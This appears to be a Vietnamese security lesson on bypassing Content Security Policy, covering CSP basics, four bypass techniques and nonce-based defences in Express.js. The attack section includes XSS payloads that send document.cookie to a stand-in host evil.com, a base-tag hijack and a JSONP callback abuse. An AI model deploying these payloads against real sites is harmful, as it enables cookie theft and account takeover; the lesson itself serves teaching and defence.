# Content Security Policy (CSP) Bypass

> **CWE**: CWE-693 | **Phân loại**: Security Misconfiguration

## Kiến thức Nền tảng
Hãy tưởng tượng trang web của bạn giống như một tòa lâu đài đang mở tiệc đãi khách. Bạn thuê một người quản gia nghiêm khắc và đưa cho người đó một danh sách ghi rõ: "Tối nay, chúng ta chỉ tiếp nhận rượu vang từ hầm nhà mình (`'self'`) và một cửa hàng tin cậy là `cdn.trusted.com`. Bất kỳ ai mang đồ ăn thức uống từ nguồn khác đến đều phải bị chặn lại ở cửa". Danh sách quy tắc an toàn này được gọi là **CSP** (Content Security Policy - Chính sách bảo mật nội dung). Đây là một chiếc khiên chắn cực kỳ vững chắc được gửi từ máy chủ qua tiêu đề HTTP để ra lệnh cho trình duyệt: "Chỉ được phép chạy các đoạn mã (script), hình ảnh hoặc giao diện từ các nguồn nằm trong danh sách an toàn này".

Cơ chế này ra đời nhằm làm thất bại hoàn toàn các cuộc tấn công **XSS** (Cross-Site Scripting). Ngay cả khi kẻ tấn công bằng cách nào đó đã lén lút tuồn được một đoạn mã độc vào trang web của bạn (giống như kẻ xấu lén bỏ độc vào ly nước trên bàn tiệc), trình duyệt khi nhìn thấy đoạn mã đó không có "thẻ căn cước hợp lệ" (gọi là **nonce** — một chuỗi mã ngẫu nhiên duy nhất được thay đổi mỗi lần tải trang) sẽ ngay lập tức từ chối chạy nó.

Mỗi một chỉ thị trong CSP sẽ cai quản một loại tài nguyên riêng: `script-src` quản lý mã JavaScript, `style-src` quản lý giao diện CSS, và `default-src` là chốt chặn cuối cùng cho tất cả những gì còn lại. Trình duyệt sẽ đọc và phân tích các chỉ thị này để áp dụng quy tắc bảo vệ nghiêm ngặt trên trang.

```http
# Well-configured CSP header
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-r4nd0mN0nc3' https://cdn.trusted.com;
  style-src 'self';
  img-src 'self' data:;
  connect-src 'self' https://api.trusted.com;
  font-src 'self';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
```

```html
<!-- Browser only executes scripts matching the nonce -->
<script nonce="r4nd0mN0nc3">
    // This script runs because nonce matches CSP header
    console.log("Legitimate script executed");
</script>

<script>
    // This script is BLOCKED — no valid nonce attribute
    alert("XSS attempt");
</script>
```

Mỗi directive trong CSP kiểm soát một loại tài nguyên. Trình duyệt parse header này và enforce policy cho mọi tài nguyên trên trang.

## Mô tả lỗ hổng
Lỗ hổng **Bypass CSP** (Vượt qua chính sách bảo mật nội dung) xảy ra không phải do bản thân công nghệ CSP bị lỗi, mà xuất phát từ việc lập trình viên thiết lập quy tắc bảo vệ quá cẩu thả hoặc quá lỏng lẻo. Nó giống như việc người quản gia cầm một danh sách cho phép ghi: "Chấp nhận đồ ăn từ mọi nguồn ngoài đường (`unsafe-inline`)" hoặc "Cho phép khách tự ý thay đổi địa chỉ giao hàng". Đây không phải lỗi của đặc tả CSP mà là lỗi cấu hình (configuration) — một dạng Security Misconfiguration điển hình.

Các sai lầm phổ biến bao gồm việc cho phép chạy các đoạn mã trực tiếp không cần kiểm tra (`unsafe-inline`), cho phép thực thi các chuỗi ký tự thành mã (`unsafe-eval`), thiếu chỉ thị `base-uri`, hoặc đưa các tên miền lớn chứa các dịch vụ công cộng (như các CDN dùng chung hoặc các điểm nhận dữ liệu JSONP) vào danh sách tin cậy.

## Cơ chế tấn công
**Bypass 1: `unsafe-inline` — vô hiệu hóa CSP hoàn toàn cho XSS**

```http
# Weak CSP: unsafe-inline allows ANY inline script to execute
Content-Security-Policy: script-src 'self' 'unsafe-inline';
```

```html
<!-- Attacker injects inline script — CSP allows it due to unsafe-inline -->
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

**Bypass 2: JSONP Endpoint trên whitelisted domain**

```http
# CSP whitelists googleapis.com — but it hosts JSONP endpoints
Content-Security-Policy: script-src 'self' https://*.googleapis.com;
```

```html
<!-- Attacker abuses JSONP callback to execute arbitrary code -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script>
```

**Bypass 3: Thiếu `base-uri` — hijack relative URLs**

```http
# CSP missing base-uri directive
Content-Security-Policy: script-src 'nonce-abc123';
```

```html
<!-- Attacker injects base tag to redirect all relative URLs -->
<base href="https://evil.com/">
<!-- All relative script paths now load from evil.com -->
<!-- <script src="/app.js"> becomes https://evil.com/app.js -->
```

**Bypass 4: `unsafe-eval` — khai thác eval() chain**

```http
Content-Security-Policy: script-src 'self' 'unsafe-eval';
```

```javascript
// Attacker leverages DOM-based sink that calls eval()
// If application uses: element.innerHTML = userInput
// Attacker crafts input triggering eval chain via existing code
const payload = "fetch('https://evil.com/exfil?d='+document.cookie)";
window.eval(payload);  // Allowed by unsafe-eval
```

## Biện pháp phòng thủ
- **Tóm tắt**: Phòng thủ chống bypass chính sách bảo mật nội dung (CSP) bằng cách loại bỏ các chỉ thị không an toàn, khai báo base-uri an toàn, kiểm tra kỹ lưỡng danh sách tên miền cho phép và triển khai báo cáo vi phạm CSP.
- **Các bước chi tiết**:
  - **Loại bỏ unsafe-inline và unsafe-eval**: sử dụng `nonce-based` hoặc `hash-based` CSP để thay thế.
  - **Khai báo base-uri 'self'**: ngăn chặn tấn công chèn thẻ `<base>`.
  - **Kiểm tra danh sách trắng tên miền (Check domain whitelist)**: đảm bảo các tên miền được phép không chứa các điểm cuối JSONP hoặc chuyển hướng hở.
  - **Sử dụng strict-dynamic**: cho phép tải các script từ các script đáng tin cậy mà không cần phải đưa domain vào danh sách trắng.
  - **Báo cáo vi phạm CSP (CSP reporting)**: bật chỉ thị `report-uri` hoặc `report-to` để theo dõi các trường hợp vi phạm chính sách.

## Code Example
```javascript
// === VULNERABLE CSP (Express.js) ===
app.use((req, res, next) => {
    // BAD: unsafe-inline + unsafe-eval + wildcard subdomain
    res.setHeader('Content-Security-Policy',
        "default-src 'self'; " +
        "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.googleapis.com; " +
        "style-src 'self' 'unsafe-inline'"
    );
    next();
});


// === SECURE CSP (Express.js with nonce) ===
const crypto = require('crypto');

app.use((req, res, next) => {
    // Generate cryptographically random nonce per request
    const nonce = crypto.randomBytes(16).toString('base64');
    res.locals.cspNonce = nonce;

    // GOOD: Strict nonce-based CSP with all critical directives
    res.setHeader('Content-Security-Policy', [
        "default-src 'none'",
        `script-src 'nonce-${nonce}' 'strict-dynamic'`,
        "style-src 'self'",
        "img-src 'self' data:",
        "connect-src 'self'",
        "font-src 'self'",
        "base-uri 'self'",
        "form-action 'self'",
        "frame-ancestors 'none'",
        "report-uri /csp-report"
    ].join('; '));
    next();
});

// In EJS/Pug template: <script nonce="<%= cspNonce %>">...</script>
```


## Xem thêm
- [Clickjacking](../clickjacking/) — Xem thêm bài học về Clickjacking.

## Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/cross-site-scripting/content-security-policy
- HackTricks CSP Bypass: https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
- CWE-693: https://cwe.mitre.org/data/definitions/693.html
- CSP Evaluator: https://csp-evaluator.withgoogle.com/

## Giải thích thuật ngữ
- **Content Security Policy (CSP)**: Chính sách bảo mật nội dung, là một cơ chế giúp kiểm soát các nguồn tài nguyên mà trình duyệt được phép tải và thực thi cho trang web.
- **Cross-Site Scripting (XSS)**: Lỗ hổng chèn mã kịch bản chéo trang, cho phép kẻ tấn công thực thi JavaScript độc hại trên trình duyệt của nạn nhân.
- **Nonce**: Một chuỗi ký tự ngẫu nhiên duy nhất chỉ được sử dụng một lần (number used once), được máy chủ tạo ra và đính kèm vào CSP header cùng các thẻ script để xác minh tính chính danh của script đó.
- **Directive (Chỉ thị)**: Các quy tắc cấu hình cụ thể trong CSP để quản lý từng loại tài nguyên (ví dụ: script-src, style-src).
- **JSONP (JSON with Padding)**: Một kỹ thuật truyền dữ liệu chéo nguồn gốc đời đầu bằng cách sử dụng thẻ `<script>` để gọi một hàm callback chứa dữ liệu JSON.
- **Unsafe-inline / Unsafe-eval**: Các tùy chọn lỏng lẻo trong CSP cho phép chạy trực tiếp JavaScript viết trực tiếp trong HTML hoặc chuyển đổi chuỗi thành mã lệnh (hàm `eval`).
- **CDN (Content Delivery Network)**: Mạng lưới phân phối nội dung, hệ thống các máy chủ trên toàn cầu giúp tải tài nguyên web nhanh hơn.
